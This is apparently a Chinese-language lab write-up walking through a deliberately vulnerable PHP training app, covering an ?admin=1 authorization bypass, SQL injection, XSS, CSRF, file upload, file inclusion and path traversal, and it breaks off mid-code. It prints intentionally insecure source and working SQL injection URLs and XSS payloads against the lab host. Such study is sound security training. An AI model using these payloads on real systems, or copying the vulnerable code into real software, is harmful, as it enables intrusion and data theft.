<p>错误：SQLSTATE[HY000]: General error: 1105 XPATH syntax error: &#039;<del>root@localhost</del>&#039;</p>
<p>&#x2F;&#x2F; 故意不调用 session_regenerate_id(true) 演示会话固定<br>代码中特地强调了，当我们每次登录同一个账号的时候，PHP 会继续沿用客户端传来的旧 ID<br>PHPSESSID&#x3D;fps34jck8tltf33hduna452nak;</p>
<h1 id="Modules"><a href="#Modules" class="headerlink" title="Modules"></a>Modules</h1><h2 id="auth"><a href="#auth" class="headerlink" title="auth"></a>auth</h2><p>这部分下基本上就一句代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_admin</span> = (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;admin&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;admin&#x27;</span>] === <span class="string">&#x27;1&#x27;</span>) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>

<p>从 url 中获取 <code>?admin=1</code> 的变量值然后就可以越权访问<br><img src="/images/Pasted%20image%2020260115113009.png"></p>
<h2 id="cache"><a href="#cache" class="headerlink" title="cache"></a>cache</h2><h2 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/../../core/init.php&#x27;</span>; <span class="meta">?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$pdo</span> = <span class="title function_ invoke__">db</span>();  </span><br><span class="line"><span class="variable">$res</span> = <span class="literal">null</span>; <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$pdo</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;  </span><br><span class="line">    <span class="comment">// 数字型注入示例：id=1 或 id=1 OR 1=1    $id = $_GET[&#x27;id&#x27;];  </span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT id, username, email, is_admin FROM users WHERE id=&quot;</span> . <span class="variable">$id</span>;  </span><br><span class="line">    <span class="keyword">try</span> &#123; <span class="variable">$res</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>)-&gt;<span class="title function_ invoke__">fetchAll</span>(); &#125; <span class="keyword">catch</span> (<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123; <span class="variable">$msg</span> = <span class="title function_ invoke__">h</span>(<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>()); &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$pdo</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>])) &#123;  </span><br><span class="line">    <span class="comment">// 字符型注入示例：q=admin&#x27; OR &#x27;1&#x27;=&#x27;1  </span></span><br><span class="line">    <span class="variable">$q</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>];  </span><br><span class="line">    <span class="variable">$sql2</span> = <span class="string">&quot;SELECT id, username, email, is_admin FROM users WHERE username=&#x27;&quot;</span> . <span class="variable">$q</span> . <span class="string">&quot;&#x27;&quot;</span>;  </span><br><span class="line">    <span class="keyword">try</span> &#123; <span class="variable">$res</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql2</span>)-&gt;<span class="title function_ invoke__">fetchAll</span>(); &#125; <span class="keyword">catch</span> (<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123; <span class="variable">$msg</span> = <span class="title function_ invoke__">h</span>(<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>()); &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>非常明显的 sql 注入<br>第一个数字型的不需要单引号闭合</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://servbay.host/modules/sqli/index.php?id=1%20or%201=1%20union%20select%20user(),version(),2,3</span><br></pre></td></tr></table></figure>
<p><img src="/images/Pasted%20image%2020260115160009.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://servbay.host/modules/sqli/index.php?q=admin%27+union+select+table_name%2C%271%27%2C%272%27%2C%273%27+from+information_schema.tables+%23</span><br></pre></td></tr></table></figure>
<p><img src="/images/Pasted%20image%2020260115160956.png"></p>
<h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>关键代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;你搜索了：<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>]) ? (<span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>]) : <span class="string">&#x27;（空）&#x27;</span>; <span class="meta">?&gt;</span>&lt;/p&gt;</span><br></pre></td></tr></table></figure>

<p>这里并没有做任何的过滤<br>所以 payload 就为 </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$pdo</span> = <span class="title function_ invoke__">db</span>();  </span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$pdo</span> &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;  </span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line">    <span class="variable">$uid</span> = <span class="title function_ invoke__">current_user</span>()[<span class="string">&#x27;id&#x27;</span>] ?? <span class="number">2</span>; <span class="comment">// 未登录则默认 guest    try &#123;  </span></span><br><span class="line">        <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="string">&quot;INSERT INTO comments(user_id, content) VALUES(<span class="subst">&#123;$uid&#125;</span>, &#x27;&quot;</span>.<span class="variable">$content</span>.<span class="string">&quot;&#x27;)&quot;</span>);  </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;已提交（未过滤，存在存储型XSS风险）&#x27;</span>;  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123;  </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;&lt;span class=&quot;danger&quot;&gt;错误：&#x27;</span>.<span class="title function_ invoke__">h</span>(<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>()).<span class="string">&#x27;&lt;/span&gt;&#x27;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$rows</span> = <span class="variable">$pdo</span> ? <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;SELECT c.id, u.username, c.content, c.created_at FROM comments c LEFT JOIN users u ON c.user_id=u.id ORDER BY c.id DESC LIMIT 20&#x27;</span>)-&gt;<span class="title function_ invoke__">fetchAll</span>() : [];  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">panel</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">  &lt;<span class="title">h3</span>&gt;最新评论&lt;/<span class="title">h3</span>&gt;  </span></span><br><span class="line"><span class="class">  &lt;?<span class="title">php</span> <span class="title">foreach</span>($<span class="title">rows</span> <span class="title">as</span> $<span class="title">r</span>): ?&gt;  </span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">style</span>=&quot;<span class="title">padding</span>:8<span class="title">px</span>;<span class="title">border</span>-<span class="title">bottom</span>:1<span class="title">px</span> <span class="title">dashed</span> <span class="title">rgba</span>(127,90,240,0.2)&quot;&gt;  </span></span><br><span class="line"><span class="class">      &lt;<span class="title">strong</span>&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> <span class="title">h</span>($<span class="title">r</span>[&#x27;<span class="title">username</span>&#x27;] ?: &#x27;<span class="title">anonymous</span>&#x27;); ?&gt;&lt;/<span class="title">strong</span>&gt; 评论：  </span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span>&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">r</span>[&#x27;<span class="title">content</span>&#x27;]; ?&gt;&lt;/<span class="title">div</span>&gt;  </span></span><br><span class="line"><span class="class">      &lt;<span class="title">small</span> <span class="title">class</span>=&quot;<span class="title">muted</span>&quot;&gt;时间：&lt;?<span class="title">php</span> <span class="title">echo</span> <span class="title">h</span>($<span class="title">r</span>[&#x27;<span class="title">created_at</span>&#x27;]); ?&gt;&lt;/<span class="title">small</span>&gt;  </span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;  &lt;?<span class="title">php</span> <span class="title">endforeach</span>; ?&gt;  </span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload 和反射型一样，由于每次访问页面的时候都会去加载评论所以就会导致存储型 XSS<br>但是这个地方同时还存在 sql 注入<br>payload 为：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;),(1,(select user())) #</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/Pasted%20image%2020260116094554.png"></p>
<h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p>DOM 型 XSS 的攻击原理</p>
<ol>
<li>数据源获取：<br> 前端 JS 通过location.href、document.URL、localStorage等方式获取用户可控数据（如 URL 参数、Cookie）。</li>
<li>DOM 动态操作：<br> JS 使用innerHTML、outerHTML、document.write()等危险 API，将未过滤的数据源直接写入 DOM。</li>
<li>脚本执行：<br> 浏览器解析 DOM 时，执行嵌入的恶意脚本。</li>
</ol>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php require_once __DIR__ . &#x27;/../../core/init.php&#x27;; ?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span> /&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>XSS - DOM 型<span class="tag">&lt;/<span class="name">title</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/assets/css/style.css&quot;</span> /&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">header</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;brand&quot;</span>&gt;</span>XSS DOM 型<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;links&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span>&gt;</span>返回首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">header</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">main</span> <span class="attr">class</span>=<span class="string">&quot;container module&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel&quot;</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>将 payload 放在 URL 的 <span class="tag">&lt;<span class="name">code</span>&gt;</span>#hash<span class="tag">&lt;/<span class="name">code</span>&gt;</span> 中，例如：<span class="tag">&lt;<span class="name">code</span>&gt;</span>#<span class="symbol">&amp;lt;</span>img src=x onerror=alert(1)<span class="symbol">&amp;gt;</span><span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;result&quot;</span> <span class="attr">class</span>=<span class="string">&quot;panel&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span>  <span class="tag">&lt;/<span class="name">main</span>&gt;</span>  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel explain&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>原理解析<span class="tag">&lt;/<span class="name">h3</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>DOM 型 XSS 由前端在浏览器中不安全地处理可控数据（如 <span class="tag">&lt;<span class="name">code</span>&gt;</span>location.hash<span class="tag">&lt;/<span class="name">code</span>&gt;</span>），导致把内容直接注入 DOM。<span class="tag">&lt;/<span class="name">p</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>常见利用方式<span class="tag">&lt;/<span class="name">h3</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span>      <span class="tag">&lt;<span class="name">li</span>&gt;</span>把 payload 放在 hash/query，再由脚本写入 <span class="tag">&lt;<span class="name">code</span>&gt;</span>innerHTML<span class="tag">&lt;/<span class="name">code</span>&gt;</span>。<span class="tag">&lt;/<span class="name">li</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>利用不安全的第三方前端组件或自定义解析。<span class="tag">&lt;/<span class="name">li</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span>    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>常见绕过与修复<span class="tag">&lt;/<span class="name">h3</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span>      <span class="tag">&lt;<span class="name">li</span>&gt;</span>修复：使用 <span class="tag">&lt;<span class="name">code</span>&gt;</span>textContent<span class="tag">&lt;/<span class="name">code</span>&gt;</span> 或安全模板渲染，不直接拼接为 HTML。<span class="tag">&lt;/<span class="name">li</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>修复：对 URL 片段进行严格校验与编码，结合 CSP。<span class="tag">&lt;/<span class="name">li</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span>  <span class="tag">&lt;/<span class="name">div</span>&gt;</span>  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">    <span class="comment">// 演示：直接写入 hash 到 innerHTML，导致 DOM XSS </span></span></span><br><span class="line"><span class="language-javascript">       <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;result&#x27;</span>).<span class="property">innerHTML</span> = location.<span class="property">hash</span>.<span class="title function_">slice</span>(<span class="number">1</span>);  </span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>document.getElementById(&#39;result&#39;).innerHTML = location.hash.slice(1);</code> </p>
<ul>
<li><strong><code>location.hash</code></strong>：获取 URL 中 <code>#</code> 及其后面的内容。</li>
<li><strong><code>.slice(1)</code></strong>：去掉开头的 <code>#</code> 号，剩下用户输入的字符串。</li>
<li><strong><code>.innerHTML</code></strong>：将获取到的字符串作为 <strong>HTML 代码</strong> 解析并插入到 ID 为 <code>result</code> 的容器中。</li>
</ul>
<p><img src="/images/Pasted%20image%2020260116102541.png"><br>但是似乎是由于浏览器的安全策略，导致 payload 无法生效</p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">require_login</span>(); <span class="variable">$pdo</span> = <span class="title function_ invoke__">db</span>(); <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$pdo</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>])) &#123;  </span><br><span class="line">    <span class="comment">// 漏洞点：不校验 CSRF，且使用 GET 改变状态（高危）  </span></span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>];  </span><br><span class="line">    <span class="variable">$uid</span> = <span class="title function_ invoke__">current_user</span>()[<span class="string">&#x27;id&#x27;</span>];  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="string">&quot;UPDATE users SET email=&#x27;&quot;</span>.<span class="variable">$email</span>.<span class="string">&quot;&#x27; WHERE id=&quot;</span>.<span class="variable">$uid</span>);  </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;邮箱已更新为：&#x27;</span> . <span class="title function_ invoke__">h</span>(<span class="variable">$email</span>);  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123;  </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;&lt;span class=&quot;danger&quot;&gt;错误：&#x27;</span>.<span class="title function_ invoke__">h</span>(<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>()).<span class="string">&#x27;&lt;/span&gt;&#x27;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用 burpsuite 制作一个 csrf poc<br><img src="/images/Pasted%20image%2020260117142838.png"><br>然后复制链接到 web 页面中，一访问就会自动跳转修改 emai 值</p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;  </span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$f</span>[<span class="string">&#x27;error&#x27;</span>] === UPLOAD_ERR_OK) &#123;  </span><br><span class="line">        <span class="comment">// 演示：仅基于文件名扩展名做简单判断，可双扩展绕过，如 shell.php.jpg        $name = $f[&#x27;name&#x27;];  </span></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>, PATHINFO_EXTENSION));  </span><br><span class="line">        <span class="variable">$allow</span> = [<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>];  </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow</span>)) &#123;  </span><br><span class="line">            <span class="variable">$target</span> = <span class="keyword">__DIR__</span> . <span class="string">&#x27;/../../uploads/&#x27;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$name</span>);  </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$f</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$target</span>)) &#123;  </span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传成功：&lt;a href=&quot;/uploads/&#x27;</span>.<span class="title function_ invoke__">h</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$name</span>)).<span class="string">&#x27;&quot; target=&quot;_blank&quot;&gt;查看文件&lt;/a&gt;&#x27;</span>;  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;&lt;span class=&quot;danger&quot;&gt;移动失败&lt;/span&gt;&#x27;</span>;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;&lt;span class=&quot;danger&quot;&gt;不允许的扩展名：&#x27;</span>.<span class="title function_ invoke__">h</span>(<span class="variable">$ext</span>).<span class="string">&#x27;&lt;/span&gt;&#x27;</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;&lt;span class=&quot;danger&quot;&gt;上传错误代码：&#x27;</span>.<span class="variable">$f</span>[<span class="string">&#x27;error&#x27;</span>].<span class="string">&#x27;&lt;/span&gt;&#x27;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>$ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));  </code><br>这个代码从字符串中寻找最后一个 <code>.</code> 然后返回那个 <code>.</code> 之后的所有字符<br>然后再使用 in_array 来验证文件后缀名，这里是白名单校验<br>所以如果没有什么中间件的解析漏洞的话基本上就是绕不过去，但是也可以尝试去配合文件包含的组合拳</p>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="comment">// 演示：未做白名单的文件包含，可 LFI / RFI</span></span><br><span class="line"><span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] ?? <span class="string">&#x27;home&#x27;</span>;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="comment">// 演示：RFI 需 allow_url_include=On（在现代PHP默认关闭），否则此处只能 LFI。  </span></span><br><span class="line"><span class="comment">// 直接拼接，存在路径遍历与远程包含风险  </span></span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$page</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$path</span>, <span class="string">&#x27;://&#x27;</span>) !== <span class="literal">false</span>) &#123;  </span><br><span class="line">    @<span class="keyword">include</span> <span class="variable">$path</span>;  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    @<span class="keyword">include</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/../../pages/&#x27;</span> . <span class="variable">$path</span> . <span class="string">&#x27;.php&#x27;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码中通过 <code>strpos($path, &#39;://&#39;)</code> 来检查用户输入十分饱包含协议头。如果包含 <code>://</code>（如 <code>http://</code>, <code>ftp://</code>），则当作远程文件处理。</p>
<p>但是这种存在触发条件，<code>php.ini</code> 配置文件中 <code>allow_url_include = On</code>。现代的 php 默认关闭，老系统中可能比较的常见</p>
<p>如果不包含 <code>://</code>，代码会强制在结尾拼接 <code>.php</code>： <code>__DIR__ . &#39;/../../pages/&#39; . $path . &#39;.php&#39;</code></p>
<h2 id="路径遍历"><a href="#路径遍历" class="headerlink" title="路径遍历"></a>路径遍历</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;<span class="variable">$content</span> = <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;  </span><br><span class="line">    <span class="comment">// 演示：未限制目录，存在路径遍历读取  </span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];  </span><br><span class="line">    <span class="variable">$target</span> = <span class="keyword">__DIR__</span> . <span 